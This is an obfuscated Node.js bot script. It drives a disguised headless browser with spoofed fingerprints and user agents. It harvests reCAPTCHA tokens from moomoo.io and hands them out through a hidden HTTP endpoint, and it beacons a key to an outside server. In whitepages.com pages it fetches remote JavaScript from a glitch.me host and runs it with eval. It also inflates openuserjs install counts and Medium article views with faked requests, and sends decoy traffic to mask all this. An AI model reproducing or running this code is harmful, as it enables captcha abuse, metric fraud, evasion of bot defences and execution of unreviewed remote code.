      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': U(0x1) + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + W(0xa, 'DP(p') + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + U(0x10) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + W(0xb, 'wjn!') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + U(0x13) + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + V(0x12) + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    W(0x15, 'ZNcV') + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    W(0x3, 'u@MI') + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xfef + 0x6cc + -0x16bb
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xaa * 0x25 + -0x1cd * -0xf + -0x271)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x9 * 0x20f + 0x1626 + -0x1 * 0x33b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1 * -0x1435 + -0x193 * 0x2 + 0x1 * -0x10ab), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x2009 + 0x1359 * -0x1 + -0xcb0;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x21fb + 0x1111 + -0xa * -0x1b1; w < getRandomInt(0x508 + -0x1e04 + 0x18fd * 0x1, -0x16c9 + -0x55 * -0x59 + -0x6bf); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x12c45 + -0x12c3 + 0x114b4 * 0x2);
        }
      }();
    }, -0x3 * 0x3c2 + -0x1 * -0xbc3 + 0x5 * -0x5), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xd26 + 0x1a73 + 0xd33 * -0x3;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xb0f + -0x26e + -0x8a1 * 0x1, 0x6f * -0x15 + 0x147a + 0xb2d * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xd4a9 + -0x1b03 + -0x4476);
    }, -0xf38 + 0x18cb + 0x92f * -0x1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1ec9 + -0x2057 * 0x1 + 0x3f20;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1858 + -0x3 * -0x5c2 + -0x1de6), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xc22 * 0x1 + 0x8f * 0x29 + -0xac5), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x372fb + 0x1767a5 + 0x6390a * -0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x2 * -0x46e + -0x1d13 + -0x1 * -0x2653);
  })()), doFlags[W(0x5, 'u1l)') + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1ca0 + -0x1 * 0x13a4 + 0x310c);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xad * 0x3d + -0xaa4 + 0xfb);
}
doFlags['doOUJS'] && ((async () => {
  const X = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x156f + -0x1251 + -0x1 * -0x27c1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * 0x16f6 + 0x156 * -0x11 + -0x427 * -0xb));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x576 + -0x1 * 0xedc + -0x9 * -0x242, D['indexOf']('\x20'));
        return B ? E['slice'](-0x2434 + -0x23cb + 0x47ff * 0x1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1559 + 0x8e7 * 0x6 + 0x255 * 0x3),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x81 * 0x3a + 0xc2 * 0x2a + 0x2476),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + X(0xe, 'NE*t') + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2303 * 0x1 + -0x1289 + -0x107a; k < 0x13 * 0x67 + -0x2458 + 0x1cb7; k++)
    setTimeout(f, (0xd424 + 0x1 * -0xaab + 0x1 * 0x20e7) * k * getRandomInt(0x4 * 0x4ac + 0x236f * -0x1 + -0x10 * -0x10c, 0x431 + 0x3 * -0xb6f + 0xb * 0x2bd));
  setInterval(() => {
    f();
    for (let l = -0x3a * 0x6a + 0x1 * -0xf95 + 0x2799; l < 0x9 * -0x227 + -0xb2 * 0x25 + 0x2d1d * 0x1; l++)
      setTimeout(f, (0x1b595 + 0x16314 + -0x22e49) * l * getRandomInt(-0x1274 + -0x167 * 0x1 + -0x29 * -0x7c, 0x355 * -0xb + -0x57 * -0x69 + 0xfb));
  }, 0xcd567 + 0x3fab03 + -0x1591ea);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
